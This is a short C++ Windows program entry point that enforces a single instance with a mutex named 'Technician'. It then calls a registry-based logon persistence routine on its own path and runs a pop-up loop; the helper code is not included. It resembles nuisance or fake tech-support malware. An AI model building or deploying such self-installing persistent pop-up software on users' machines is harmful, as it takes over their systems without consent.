#include <iostream>
#include <windows.h>

#include "PopUp.h"
#include "Presistence.h"

#define MUTEX_NAME "Technician"

int main(int argc, char* argv[]) {
    HANDLE hMutex = CreateMutexExA(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
    DWORD wait = WaitForSingleObject(hMutex, 0);

    if (wait != 0) {
        std::cout << "Process allready running\n";
        return 1;
    }

    LPCSTR path = argv[0];
    SIZE_T pathLength = strlen(path) + 1;

    RegistryLogon(path, pathLength);

    PopupLoop();

    ReleaseMutex(hMutex);

    return 0;
}
